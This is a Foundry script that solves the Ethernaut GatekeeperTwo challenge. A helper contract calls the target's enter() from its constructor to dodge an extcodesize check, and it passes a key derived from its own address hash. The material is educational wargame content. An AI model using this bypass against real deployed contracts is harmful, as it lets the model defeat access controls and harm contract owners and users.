// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {GatekeeperTwo} from "../../challenge-contracts/14-GatekeeperTwo.sol";

contract GatekeeperTwoSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Solution contract and solve the puzzle in constructor;
        new Solution(challengeInstance);

        // Step 3: Confirm that caller `heroAddress` has successfully become entrant of the GatekeeperTwo contract.
        GatekeeperTwo two = GatekeeperTwo(challengeInstance);
        address heroAddress = vm.addr(heroPrivateKey);
        require(two.entrant() == heroAddress, "Entrant check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(14));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Solution {
    constructor(address gateAddress) {
        bytes8 key = bytes8(
            type(uint64).max -
                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );

        (bool success, ) = gateAddress.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(key))
        );
        require(success, "Call enter() failed");
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
